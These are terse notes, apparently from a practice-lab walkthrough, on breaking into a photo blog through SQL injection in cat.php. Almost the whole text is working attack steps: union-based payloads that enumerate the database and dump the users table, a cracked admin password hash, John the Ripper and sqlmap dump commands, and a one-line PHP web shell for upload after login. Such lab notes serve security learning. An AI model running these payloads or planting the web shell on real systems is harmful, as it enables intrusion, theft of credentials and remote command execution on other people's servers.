cat.php is vulnerable to injection cat.php?id=1'
cat.php?id=1 ORDER BY 5
cat.php?id=1 UNION SELECT 1,2,3,4
We get picture '2' returned, so we can use 2 field to inject current_user(), database(), @@version etc.
cat.php?id=1 UNION SELECT 1,current_user(),3,4
p.s. the title uses 2.  3 is used for the image path, but the alt is 2 which gets rendered since no such image exists.

meta tables in MySQL >= 5.
SELECT table_name FROM information_schema.tables
cat.php?id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables
column_name FROM information_schema.columns
UNION SELECT 1,column_name,3,4 FROM information_schema.columns

cat.php?id=1 UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns
OR
UNION SELECT 1,concat(table_name,':',column_name),3,4 FROM information_schema.columns
Shows us users table with login and password.

cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4 FROM users
admin:8efe310f9ab3efeae8d410a8e0166eb2
It's hashed.
john passwd --format=raw-md5 --wordlist=/foo --rules
admin:P4ssw0rd

OR just use SQLMAP LOL
sqlmap -u http://192.168.1.94/cat.php?id=1 -D photoblog --dump-all --batch

Now we can login to the site and upload files with embedded php
<?php system($_GET['c']); ?>
or php-reverse-shell.php3
